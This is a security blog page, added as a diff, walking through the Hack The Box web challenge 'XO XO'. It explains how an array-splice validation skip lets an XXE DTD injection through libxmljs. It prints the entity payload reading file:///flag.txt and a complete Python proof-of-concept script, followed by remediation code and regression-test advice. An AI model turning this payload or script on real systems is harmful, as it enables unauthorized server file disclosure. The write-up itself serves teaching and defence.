@@ -1,0 +1,425 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#0b1220">
+<meta name="description" content="An evidence-driven Hack The Box web challenge walkthrough: bypassing an array-validation bug, injecting a DTD entity, and demonstrating server-side file disclosure through libxmljs. Flag intentionally withheld.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack The Box XO XO — From an Array Bug to XXE">
+<meta property="og:description" content="An evidence-driven Hack The Box web challenge walkthrough: bypassing an array-validation bug, injecting a DTD entity, and demonstrating server-side file disclosure through libxmljs. Flag intentionally withheld.">
+<meta name="author" content="GregoGuard">
+<link rel="icon" type="image/png" href="favicon.png">
+<link rel="stylesheet" href="assets/site.css">
+<title>Hack The Box XO XO — From an Array Bug to XXE | GregoGuard</title>
+<style>
+.gg-case-intro{max-width:850px}
+.gg-article-layout{display:grid;grid-template-columns:225px minmax(0,1fr);gap:44px;align-items:start}
+.gg-toc{border:1px solid var(--line);background:var(--bg2);border-radius:12px;padding:20px;position:sticky;top:100px;max-height:calc(100vh - 120px);overflow:auto}
+.gg-toc strong{display:block;font-size:11px;letter-spacing:.13em;text-transform:uppercase;color:var(--cyan);margin-bottom:13px}
+.gg-toc a{display:block;font-size:12px;line-height:1.5;padding:7px 0;color:var(--muted)}
+.gg-toc a:hover{color:var(--cyan)}.gg-toc .toc-h3{padding-left:14px;font-size:11px}
+.gg-content{max-width:none;min-width:0;padding-top:0}
+.gg-content h2{scroll-margin-top:100px;font-size:29px;margin:48px 0 16px;padding-bottom:13px;border-bottom:1px solid var(--line)}
+.gg-content h3{scroll-margin-top:100px;font-size:20px;margin:26px 0 12px;color:#f4f7fc}
+.gg-content p,.gg-content li{color:#c7d3e1;line-height:1.84}
+.gg-content p{margin:15px 0}.gg-content strong{color:#eef6fc}
+.gg-content ul,.gg-content ol{padding-left:27px}.gg-content li{margin:7px 0}
+.gg-content code{font-family:ui-monospace,Consolas,Monaco,monospace;font-size:.9em;color:#8fe4d7;overflow-wrap:anywhere}
+.gg-content pre{background:#0b1421;border:1px solid #33475d;border-radius:12px;padding:17px 20px;overflow:auto;box-shadow:inset 0 2px 14px #0002;margin:20px 0 25px}
+.gg-content pre code{font-size:12.5px;color:#d3e6f7;line-height:1.75;white-space:pre;overflow-wrap:normal}
+.gg-content blockquote{margin:18px 0 28px;padding:15px 22px;border-left:3px solid var(--cyan);background:#142638;border-radius:0 9px 9px 0}
+.gg-content blockquote p{margin:0;color:#d4e2ef}
+.gg-content table{border-collapse:collapse;width:100%;display:block;overflow-x:auto;margin:18px 0 26px;font-size:13px}
+.gg-content th,.gg-content td{padding:12px 14px;text-align:left;border-bottom:1px solid var(--line);vertical-align:top}
+.gg-content th{background:#17283b;color:var(--cyan);font-weight:700;white-space:nowrap}
+.gg-content hr{border:0;border-top:1px solid var(--line);margin:40px 0}
+.gg-content a{color:var(--cyan);text-decoration:underline;text-underline-offset:3px}
+.gg-article-meta{display:flex;flex-wrap:wrap;gap:8px;margin-top:25px}
+.gg-article-meta span{border:1px solid var(--line);border-radius:30px;padding:5px 11px;color:#c1ccda;font-size:11px;font-weight:700}
+.gg-method-ribbon{display:flex;gap:10px;flex-wrap:wrap;margin-top:16px}
+.gg-method-ribbon span{font-size:12px;color:var(--cyan);background:#163141;border:1px solid #2a5566;border-radius:7px;padding:8px 12px}
+.gg-article-end{margin:46px 0 25px;padding:23px 25px;background:#142638;border:1px solid #2a4e60;border-radius:11px;color:#d2e4ed}
+@media(max-width:970px){.gg-article-layout{grid-template-columns:1fr}.gg-toc{position:static;max-height:none;display:flex;gap:15px;flex-wrap:wrap}.gg-toc strong{width:100%;margin:0}.gg-toc a{display:inline-block;padding:4px}.gg-toc .toc-h3{padding-left:0}}
+@media(max-width:520px){.gg-content pre{padding:12px}.gg-content h2{font-size:24px}.gg-content pre code{font-size:11px}}
+</style>
+</head>
+<body>
+<a class="skip-link" href="#main-content">Skip to content</a>
+<header class="site-header"><div class="shell navwrap"><a href="index.html" class="wordmark" aria-label="GregoCys home"><span class="mark">◈</span> Grego<span>Cys</span></a><button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mainnav" aria-label="Toggle navigation">☰</button><nav id="mainnav" class="navlinks" aria-label="Primary navigation"><a href="index.html">Home</a><a href="about.html">About</a><a href="skills.html">Experience &amp; Skills</a><a href="certifications.html">Certifications</a><a href="portfolio.html">Projects</a><a href="GregoGaurd.html" class="active" aria-current="page">GregoGuard Research</a></nav></div></header>
+<main id="main-content">
+<section class="page-hero shell"><div class="gg-case-intro">
+<a class="back" href="GregoGaurd.html">← GregoGuard research</a>
+<span class="eyebrow">GREGO GUARD / HACK THE BOX / WEB SECURITY / COMPLETED</span>
+<h1>Hack The Box XO XO — From an Array Bug to XXE</h1>
+<p class="lead">A validated web challenge walkthrough chaining a skipped array-validation check with server-side XML external entity expansion. Full methodology; no flag disclosure.</p>
+<div class="gg-article-meta"><span>Node.js / Express</span><span>libxmljs</span><span>CWE-611 · XXE</span><span>November 17, 2026</span></div>
+<div class="gg-method-ribbon"><span>Source review</span><span>Control-flow analysis</span><span>DTD injection</span><span>Live verification</span></div>
+<div class="actions"><a class="btn secondary" href="assets/htb_xo_xo_xxe_exploit.py" download="htb_xo_xo_xxe_exploit.py">Download proof-of-concept ↓</a><a class="btn secondary" href="GregoGaurd.html">All case studies</a></div>
+</div></section>
+<section class="section shell gg-article-layout">
+<aside class="gg-toc" aria-label="Article table of contents"><strong>Contents</strong><a class="toc-h2" href="#executive-summary">Executive summary</a><a class="toc-h2" href="#1-initial-reconnaissance-and-source-review">1. Initial reconnaissance and source review</a><a class="toc-h2" href="#2-the-validation-skip">2. The validation skip</a><a class="toc-h2" href="#3-the-xml-parser-turns-the-skip-into-file-disclosure">3. The XML parser turns the skip into file disclosure</a><a class="toc-h2" href="#4-building-the-proof-of-concept">4. Building the proof-of-concept</a><a class="toc-h2" href="#5-live-validation-and-evidence">5. Live validation and evidence</a><a class="toc-h3" href="#evidence-and-reproducibility">Evidence and reproducibility</a><a class="toc-h2" href="#6-root-cause-and-remediation">6. Root cause and remediation</a><a class="toc-h3" href="#fix-the-array-iteration">Fix the array iteration</a><a class="toc-h3" href="#stop-creating-dtd-declarations-from-user-input">Stop creating DTD declarations from user input</a><a class="toc-h3" href="#add-regression-coverage">Add regression coverage</a><a class="toc-h2" href="#7-conclusion">7. Conclusion</a></aside>
+<article class="gg-content article">
+<p><em>GregoGuard Research · November 17, 2026 · Web exploitation / source-code review</em></p>
+<blockquote>
+<p><strong>Spoiler and scope notice:</strong> This is a technical walkthrough of an authorized Hack The Box challenge. It includes the vulnerability, a working proof-of-concept, and how the result was verified, but <strong>intentionally does not reveal the challenge flag</strong>. The instance host and port were ephemeral; use the address assigned to your own challenge session. Do not direct the proof-of-concept at systems without authorization.</p>
+</blockquote>
+<h2 id="executive-summary">Executive summary</h2>
+<p><strong>XO XO</strong> is a small Node.js/Express web application where authenticated users create music-themed cards. A request to <code>POST /createSongCards</code> accepts an array of song objects, validates their fields, generates XML using string interpolation, and parses it using <code>libxmljs</code>.</p>
+<p>Two flaws become exploitable when chained:</p>
+<ol>
+<li><strong>Input-validation bypass:</strong> the application removes songs mentioning a particular artist by calling <code>songs.splice(i, 1)</code> inside a forward-moving <code>for</code> loop. Removing an element shifts the following element left, but the index advances anyway. That next item is never validated.</li>
+<li><strong>XML External Entity injection (XXE):</strong> the application interpolates user-controlled strings directly into an XML document type declaration (DTD) and enables entity replacement with <code>libxmljs.parseXml(xml, { replaceEntities: true })</code>. The skipped item can introduce a new external entity referencing a local file on the server.</li>
+</ol>
+<p>A fresh, unprivileged account was sufficient to reproduce the issue. The live challenge accepted the payload, created two cards from a three-entry submission, and returned the requested server-side file contents inside the <code>thoughts</code> field of the first card. The secret value is deliberately redacted in this article.</p>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Detail</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Challenge</td>
+<td>Hack The Box — XO XO</td>
+</tr>
+<tr>
+<td>Category</td>
+<td>Web / source-code analysis</td>
+</tr>
+<tr>
+<td>Stack</td>
+<td>Node.js, Express, <code>libxmljs</code></td>
+</tr>
+<tr>
+<td>Entry point</td>
+<td><code>POST /createSongCards</code> (authenticated)</td>
+</tr>
+<tr>
+<td>Retrieval endpoint</td>
+<td><code>GET /api/songs</code> (authenticated)</td>
+</tr>
+<tr>
+<td>Main weakness</td>
+<td>CWE-611: Improper Restriction of XML External Entity Reference</td>
+</tr>
+<tr>
+<td>Contributing weakness</td>
+<td>CWE-20: Improper Input Validation</td>
+</tr>
+<tr>
+<td>Demonstrated impact</td>
+<td>Server-side local file disclosure</td>
+</tr>
+<tr>
+<td>Validation</td>
+<td>Successful against the live HTB instance, November 17, 2026</td>
+</tr>
+</tbody>
+</table>
+<h2 id="1-initial-reconnaissance-and-source-review">1. Initial reconnaissance and source review</h2>
+<p>The provided archive contained the application source and a Docker-based deployment layout. Rather than starting with a blind attack, I inspected the files offline and followed the request lifecycle. The important project files were:</p>
+<pre><code class="language-text">web_xo_xo_exploit/
+├── Dockerfile
+├── entrypoint.sh
+├── flag.txt              # local testing placeholder, not the live result
+├── index.js              # authentication, validation, XML construction
+├── package.json
+└── public/
+    ├── index.html
+    ├── register.html
+    ├── login.html
+    └── dashboard.html
+</code></pre>
+<p>The supplied archive was protected with the standard HTB challenge password, <code>hackthebox</code>. The application has several routes, but the relevant sequence is compact:</p>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Route</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>POST</code></td>
+<td><code>/api/register</code></td>
+<td>Creates an account and sets a signed JWT cookie</td>
+</tr>
+<tr>
+<td><code>POST</code></td>
+<td><code>/api/login</code></td>
+<td>Authenticates an existing account</td>
+</tr>
+<tr>
+<td><code>POST</code></td>
+<td><code>/createSongCards</code></td>
+<td>Validates and stores song cards</td>
+</tr>
+<tr>
+<td><code>GET</code></td>
+<td><code>/api/songs</code></td>
+<td>Returns the signed-in user's cards</td>
+</tr>
+</tbody>
+</table>
+<p>The registration route (source lines 159–209) issues an authentication cookie immediately after registration. As a result, there was no reason to target an administrator account or crack the hashes embedded in the source: a disposable normal account gives access to the vulnerable endpoint.</p>
+<p>The page JavaScript submits song data as JSON, but the backend later converts it into XML. <strong>That server-side JSON-to-XML conversion is the crucial trust boundary.</strong></p>
+<h2 id="2-the-validation-skip">2. The validation skip</h2>
+<p>At the start of the card-creation handler (source lines 248–281), the application copies the request body and requires at least three songs:</p>
+<pre><code class="language-javascript">var songs = Array.from(req.body);
+if (songs.length &lt; 3) {
+    return res.status(400).json({
+        error: 'You have to talk about at least 3 songs!'
+    });
+}
+</code></pre>
+<p>Then it validates each object. An input sanitizer rejects strings containing DTD-related patterns including <code>&lt;!</code>, <code>SYSTEM</code>, <code>ENTITY</code>, and <code>DOCTYPE</code>. That seems to block a straightforward XXE payload—until the loop removes entries:</p>
+<pre><code class="language-javascript">for (var i = 0; i &lt; songs.length; i++) {
+    const song = songs[i];
+
+    // Required-field, type, length, and forbidden-pattern checks ...
+
+    if (song.artist.toLowerCase().includes('drizzy') ||
+        song.artist.toLowerCase().includes('drake')) {
+        songs.splice(i, 1);
+        continue;
+    }
+}
+</code></pre>
+<p>The problem is not the artist filter itself; it is mutating the array while walking forward through it.</p>
+<p>Consider this submission:</p>
+<table>
+<thead>
+<tr>
+<th>Original index</th>
+<th>Entry</th>
+<th>Intended behavior</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>0</code></td>
+<td>Artist: <code>Drake</code></td>
+<td>Filtered out with <code>splice(0, 1)</code></td>
+</tr>
+<tr>
+<td><code>1</code></td>
+<td>Malicious XML-bearing entry</td>
+<td><strong>Moves to index 0; validation skips it</strong></td>
+</tr>
+<tr>
+<td><code>2</code></td>
+<td>Ordinary song</td>
+<td>Moves to index 1 and is validated normally</td>
+</tr>
+</tbody>
+</table>
+<p>After the deletion, the array has two entries. The loop's <code>i++</code> advances to index 1, so the malicious entry now at index 0 is never checked by <code>sanitizeInput()</code>. The earlier three-song minimum was evaluated <em>before</em> filtering and is not rechecked.</p>
+<p>This makes the blacklist irrelevant for the skipped object, including its dangerous <code>&lt;!ENTITY</code> substring.</p>
+<h2 id="3-the-xml-parser-turns-the-skip-into-file-disclosure">3. The XML parser turns the skip into file disclosure</h2>
+<p>For each surviving song, the server constructs an XML string (source lines 283–300). The user values are inserted directly into DTD entity declarations:</p>
+<pre><code class="language-javascript">const xml = `&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+    &lt;!DOCTYPE songCard [
+        &lt;!ENTITY songName &quot;${song.songName}&quot;&gt;
+        &lt;!ENTITY artist &quot;${song.artist}&quot;&gt;
+        &lt;!ENTITY thoughts &quot;${song.thoughts}&quot;&gt;]&gt;
+    &lt;songCard&gt;
+        &lt;cardInfo&gt;
+            &lt;songName&gt;&amp;songName;&lt;/songName&gt;
+            &lt;artist&gt;&amp;artist;&lt;/artist&gt;
+            &lt;thoughts&gt;&amp;thoughts;&lt;/thoughts&gt;
+        &lt;/cardInfo&gt;
+    &lt;/songCard&gt;`;
+
+const doc = libxmljs.parseXml(xml, { replaceEntities: true });
+</code></pre>
+<p>This is a particularly dangerous construction: the interpolated <code>songName</code> lives <em>inside the DTD</em>. If an attacker can terminate its quoted value, they can append another entity declaration. With external entity replacement enabled, the parser may resolve <code>SYSTEM</code> identifiers such as a <code>file://</code> URI.</p>
+<p>The entry that bypasses validation uses the following song title:</p>
+<pre><code class="language-xml">intro&quot;&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot;&gt;&lt;!ENTITY pad &quot;
+</code></pre>
+<p>Its thoughts field is a reference to the newly defined entity:</p>
+<pre><code class="language-xml">&amp;xxe;
+</code></pre>
+<p>The injected <code>&quot;&gt;</code> closes the original <code>songName</code> declaration; the new <code>xxe</code> entity points to the server-side target file; the trailing <code>&lt;!ENTITY pad &quot;</code> absorbs the quote added by the application's template so the DTD remains syntactically valid.</p>
+<p>The beginning of the resulting DTD therefore looks like this:</p>
+<pre><code class="language-xml">&lt;!DOCTYPE songCard [
+    &lt;!ENTITY songName &quot;intro&quot;&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot;&gt;&lt;!ENTITY pad &quot;&quot;&gt;
+    &lt;!ENTITY artist &quot;The Weeknd&quot;&gt;
+    &lt;!ENTITY thoughts &quot;&amp;xxe;&quot;&gt;
+]&gt;
+</code></pre>
+<p>When the server parses the XML, the <code>thoughts</code> element dereferences the <code>thoughts</code> entity, which in turn references <code>xxe</code>. The file content is then stored in <code>songData.thoughts</code> (source lines 305–325) and made available through <code>GET /api/songs</code>.</p>
+<p><strong>Important distinction:</strong> this does not read the file from the attacking workstation. <code>file:///flag.txt</code> is resolved by the XML parser running in the <strong>challenge container</strong>.</p>
+<h2 id="4-building-the-proof-of-concept">4. Building the proof-of-concept</h2>
+<p>The proof-of-concept performs the entire chain through normal HTTP routes. Its credentials are randomly generated for each run and used only within the session; the existing administrator accounts are not involved.</p>
+<p>Install the single Python dependency:</p>
+<pre><code class="language-bash">python3 -m pip install requests
+</code></pre>
+<p>Save the following as <code>htb_xo_xo_xxe_exploit.py</code>:</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;HTB XO XO: authenticated array-filter bypass + XXE proof-of-concept.&quot;&quot;&quot;
+
+import argparse
+import secrets
+import requests
+
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('base_url', help='http://CHALLENGE_HOST:PORT')
+    parser.add_argument('--file', default='/flag.txt')
+    args = parser.parse_args()
+
+    base = args.base_url.rstrip('/')
+    session = requests.Session()
+    session.trust_env = False
+
+    username = 'gg_' + secrets.token_hex(6)
+    password = secrets.token_urlsafe(18)
+
+    # Registration issues the authentication cookie for subsequent requests.
+    response = session.post(
+        f'{base}/api/register',
+        json={
+            'username': username,
+            'password': password,
+            'confirmPassword': password,
+        },
+        timeout=15,
+    )
+    response.raise_for_status()
+    print('[+] Account registered')
+
+    # First entry is removed; the second shifts left and escapes validation.
+    injected_name = (
+        'intro&quot;&gt;&lt;!ENTITY xxe SYSTEM &quot;file://' +
+        args.file + '&quot;&gt;&lt;!ENTITY pad &quot;'
+    )
+    songs = [
+        {'songName': 'Filtered', 'artist': 'Drake',
+         'thoughts': 'Removed by filter'},
+        {'songName': injected_name, 'artist': 'The Weeknd',
+         'thoughts': '&amp;xxe;'},
+        {'songName': 'Starboy', 'artist': 'The Weeknd',
+         'thoughts': 'Ordinary entry'},
+    ]
+
+    response = session.post(
+        f'{base}/createSongCards', json=songs, timeout=15
+    )
+    response.raise_for_status()
+    print('[+] Card submission:', response.status_code, response.json())
+
+    response = session.get(f'{base}/api/songs', timeout=15)
+    response.raise_for_status()
+    cards = response.json()
+    print('[+] Returned cards:', len(cards))
+
+    for index, card in enumerate(cards, start=1):
+        data = card.get('songData', {})
+        print(f'--- Card {index} ---')
+        print('Name:', data.get('songName', ''))
+        print('Artist:', data.get('artist', ''))
+        print('Thoughts:', data.get('thoughts', ''))
+
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+<p>Run it against the assigned live HTB instance:</p>
+<pre><code class="language-bash">python3 htb_xo_xo_xxe_exploit.py http://CHALLENGE_HOST:PORT
+</code></pre>
+<p>The optional <code>--file</code> parameter controls which local file the XML parser attempts to read. In this challenge, the objective file was <code>/flag.txt</code>. The same technique could disclose other files readable by the application process; no further file access was necessary for the exercise.</p>
+<h2 id="5-live-validation-and-evidence">5. Live validation and evidence</h2>
+<p>The test on November 17, 2026 succeeded against the provisioned Hack The Box instance. The request to create song cards returned HTTP <strong>200</strong> and the response:</p>
+<pre><code class="language-json">{&quot;success&quot;:true,&quot;message&quot;:&quot;Song cards created!&quot;}
+</code></pre>
+<p>A subsequent call to <code>GET /api/songs</code> returned <strong>two</strong> entries, despite three being submitted, confirming that the first song was filtered. The first returned card had the injected title reduced to <code>intro</code>, and its <code>thoughts</code> property contained the objective file's contents. The second card was the ordinary <code>Starboy</code> entry:</p>
+<pre><code class="language-text">[+] Card creation HTTP status: 200
+[+] Fetched 2 card(s)
+
+--- Card 1: intro ---
+Artist: The Weeknd
+Thoughts: [REDACTED — server-side file contents recovered]
+
+--- Card 2: Starboy ---
+Artist: The Weeknd
+Thoughts: Ordinary entry
+</code></pre>
+<p>This validates the complete chain rather than merely demonstrating that a server accepted malformed XML. The response shows (1) successful authentication, (2) deletion of the filtered entry, (3) a surviving skipped entry, and (4) entity expansion reaching the application response. The recovered challenge flag was submitted separately and is not included in this publication.</p>
+<h3 id="evidence-and-reproducibility">Evidence and reproducibility</h3>
+<p>The source bundle, the isolated extraction, and the proof-of-concept script were retained as local research evidence. SHA-256 hashes of the original inputs are recorded for repeatability:</p>
+<table>
+<thead>
+<tr>
+<th>Artifact</th>
+<th>SHA-256</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Provided challenge ZIP</td>
+<td><code>0332d4cc8a7a04cfde64adc114d50d84b00d5bc100a94c01d4042fe8e0e00df1</code></td>
+</tr>
+<tr>
+<td>Extracted <code>index.js</code></td>
+<td><code>b9fdc7e948f88aadfb7b315f2354877d11ab0f1de9b2459929d0d918a607d86c</code></td>
+</tr>
+</tbody>
+</table>
+<p>The URL's IP and port are deliberately omitted because HTB challenge allocations are temporary and should not be treated as a reusable public target.</p>
+<h2 id="6-root-cause-and-remediation">6. Root cause and remediation</h2>
+<p>The exploit requires <strong>both</strong> flaws to become a reliable file-read primitive, but each should be fixed independently.</p>
+<h3 id="fix-the-array-iteration">Fix the array iteration</h3>
+<p>Do not call <code>splice()</code> on the array being traversed with an increasing index. Filter into a new collection, then validate every retained object:</p>
+<pre><code class="language-javascript">if (!Array.isArray(req.body) || req.body.length &lt; 3) {
+    return res.status(400).json({ error: 'At least three songs required' });
+}
+
+const retainedSongs = req.body.filter(song =&gt;
+    song &amp;&amp; typeof song.artist === 'string' &amp;&amp;
+    !/drake|drizzy/i.test(song.artist)
+);
+
+for (const song of retainedSongs) {
+    // Validate required fields, types, lengths, and allowed values here.
+    // Reject the whole request if any retained song is invalid.
+}
+</code></pre>
+<p>This removes the skipped-element condition. Notice that it does <strong>not</strong>, by itself, eliminate the XXE risk: validation and safe parsing are separate controls.</p>
+<h3 id="stop-creating-dtd-declarations-from-user-input">Stop creating DTD declarations from user input</h3>
+<p>The application doesn't need XML entities to store song names, artists, or thoughts. The safest source-level repair is to avoid unnecessary XML processing and store validated structured values directly:</p>
+<pre><code class="language-javascript">const songData = {
+    songName: song.songName,
+    artist: song.artist,
+    thoughts: song.thoughts,
+    createdAt: new Date().toISOString(),
+};
+</code></pre>
+<p>If XML is a genuine functional requirement, use a proper XML builder that escapes text nodes and attributes, <strong>do not interpolate untrusted input into a DTD</strong>, and configure the XML parser to reject DTD/external entity resolution. Blacklisting a handful of keywords is not a substitute for safe construction and parser hardening.</p>
+<h3 id="add-regression-coverage">Add regression coverage</h3>
+<p>Test the combined failure mode, not just simple malicious strings. At minimum, verify that:</p>
+<ul>
+<li>A filtered entry followed by a DTD-like entry does not bypass validation.</li>
+<li>Submissions with invalid types, malformed objects, and forbidden XML syntax are rejected.</li>
+<li>XML parsing cannot resolve local files, remote resources, or nested external entities.</li>
+<li>The number of accepted entries and the authenticated account's stored records are consistent.</li>
+<li>The application never returns server-local file content through user-controlled card fields.</li>
+</ul>
+<p><strong>Weakness mapping:</strong> CWE-20 (validation bypass), CWE-611 (XXE), and CWE-200 (information exposure as demonstrated impact). The exact production severity depends on the files and permissions available to the parser process.</p>
+<h2 id="7-conclusion">7. Conclusion</h2>
+<p>XO XO illustrates how a small control-flow mistake in otherwise ordinary application logic can neutralize a security check. The missing validation would have been a data-integrity issue on its own. Combined with DTD string interpolation and external entity expansion, it became a server-side file-read vulnerability reachable by any registered user.</p>
+<p>The most useful lesson is architectural: <strong>validate complete input collections without mutation hazards, keep untrusted values out of markup syntax, and disable parser capabilities the application does not need.</strong> Each control blocks a different part of the chain.</p>
+<hr />
+<p><em>GregoGuard — independent security research and controlled challenge analysis. Source review and exploit validation performed within the authorized Hack The Box environment. Challenge flags and temporary credentials are intentionally excluded from this article.</em></p>
+
+<div class="gg-article-end"><strong>Lab-only research.</strong> The exploit was verified against an authorized Hack The Box challenge. No live flag values, authentication tokens, or challenge credentials are published here.</div>
+</article>
+</section>
+</main>
+<footer class="site-footer"><div class="shell foot-inner"><div><strong>GregoCys</strong> <span class="sep">/</span> Cybersecurity • Research • Engineering<br><small>© <span id="year">2026</span> GregoCys. Independent portfolio and educational research.</small></div><div class="footerlinks"><a href="mailto:BrandonScott@GregoCys.com">Email</a><a href="https://www.linkedin.com/in/brandon-gregory-129935263/" target="_blank" rel="noopener noreferrer">LinkedIn</a><a href="GregoGaurd.html">GregoGuard</a></div></div></footer>
+<script src="assets/site.js" defer></script>
+</body>
+</html>
